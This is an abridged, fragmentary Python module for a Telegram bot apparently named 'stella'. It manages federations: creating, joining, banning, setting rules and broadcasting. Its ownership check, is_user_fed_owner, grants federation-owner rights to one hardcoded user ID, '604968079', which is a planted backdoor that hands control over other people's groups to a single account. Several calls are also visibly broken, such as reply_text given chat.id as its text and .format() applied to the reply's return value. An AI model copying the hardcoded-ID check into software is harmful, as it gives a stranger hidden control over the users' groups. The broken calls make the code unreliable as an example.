...
from stella import dispatcher, SUDO_USERS
from stella.modules.helper_funcs.handlers import CMD_STARTERS
from stella.modules.helper_funcs.misc import is_module_loaded
from stella.modules.helper_funcs.extraction import extract_user, extract_user_and_text
from stella.modules.helper_funcs.string_handling import markdown_parser

import stella.modules.sql.feds_sql as sql



from stella.modules.connection import connected


print("stella special module don't dare to kang")
...
def new_fed(bot: Bot, update: Update, args: List[str]):
    if len(args) >= 1:
        ...
        # Hardcoded fed_id's
        if fed_name == "Stella-neel":
                fed_id = "stella-Fed"
        elif fed_name == "alluka-zoldyck":
                fed_id = "alluka-fed"
        #

        if not sql.search_fed_by_name(fed_name) == False:
                update.effective_message.reply_text(chat.id, "A federation already exists with this name, change name!")
        ...
        update.effective_message.reply_text(chat.id, "Please write federation name!")
...
def del_fed(bot: Bot, update: Update, args: List[str]):
        ...
        if is_user_fed_owner(fed_id, user.id) == False:
                update.effective_message.reply_text(chat.id, "Only fed owner can do this.")
                return
        ...
        if len(args) >= 1:
                ...
                update.effective_message.reply_text(chat.id, "Please write federation id to remove!")
    ...
    for admin in administrators:
        ...
        if status == "creator":
            ...
            if str(admin.user.id) == str(user.id):
                ...
                update.effective_message.reply_text(chat.id, "Only group creator can do it!")
                return

    if len(args) >= 1:
        sql.chat_join_fed(args[0], chat.id)
        update.effective_message.reply_text(chat.id, "Chat joined to federation!")
    else:
        update.effective_message.reply_text(chat.id, "Please write federation id to join!")
...
def user_join_fed(bot: Bot, update: Update, args: List[str]):
        ...
        if not sql.search_user_in_fed(fed_id, user_id) == False:
                update.effective_message.reply_text(chat.id, "I can't promote user which already a fed admin! But I can demote him.")
                return
...
def user_demote_fed(bot: Bot, update: Update, args: List[str]):
        ...
        if sql.search_user_in_fed(fed_id, user_id) == False:
                update.effective_message.reply_text(chat.id, "I can't demote user which not a fed admin! If you wanna bring him to tears, promote him and demote.")
                return
        ...
        if res == True:
                ...
                update.effective_message.reply_text(chat.id, "I can not remove him, I am powerless!")
...
def fed_info(bot: Bot, update: Update, args: List[str]):
        ...
        if not fed_id:
            update.effective_message.reply_text(chat.id, "This group not in any federation!")
            return

        if is_user_fed_admin(fed_id, user.id) == False:
            update.effective_message.reply_text(chat.id, "Only fed admins can do this!")
            return
...
def fed_ban(bot: Bot, update: Update, args: List[str]):
    ...
    if user_id == bot.id:
        message.reply_text(chat.id, "You can't fban me, better hit your head against the wall, it's more fun.")
        return
    ...
    for O in h:
        try:
            ...
            if excp.message in FBAN_ERRORS:
                ...
                message.reply_text(chat.id, "Could not fban due to: {}").format(excp.message)
                return
...
def unfban(bot: Bot, update: Update, args: List[str]):
    ...
    message.reply_text(chat.id, "I'll give {} a second chance in this federation.").format(user_chat.first_name)
    ...
    for O in h:
        try:
            ...
            if excp.message in UNFBAN_ERRORS:
                ...
                message.reply_text(chat.id, "Could not un-fban due to: {}").format(excp.message)
                return
...
def set_frules(bot: Bot, update: Update, args: List[str]):
    ...
    if len(args) >= 1:
        ...
        update.effective_message.reply_text(chat.id, "Rules setuped for this fed!")
    else:
...
def get_frules(bot: Bot, update: Update, args: List[str]):
    ...
    text += rules
    update.effective_message.reply_text(chat.id, text, parse_mode=ParseMode.MARKDOWN)
...
def broadcast(bot: Bot, update: Update, args: List[str]):
    ...
    if len(to_send) >= 2:
        ...
        update.effective_message.reply_text(chat.id, "Federations Broadcast complete. {} groups failed to receive the message, probably "
...
def is_user_fed_owner(fed_id, user_id):
    ...
    if int(user_id) == int(sql.get_fed_info(fed_id).owner_id) or user_id in SUDO_USERS or user_id == '604968079':
        return True
    else:
        return False
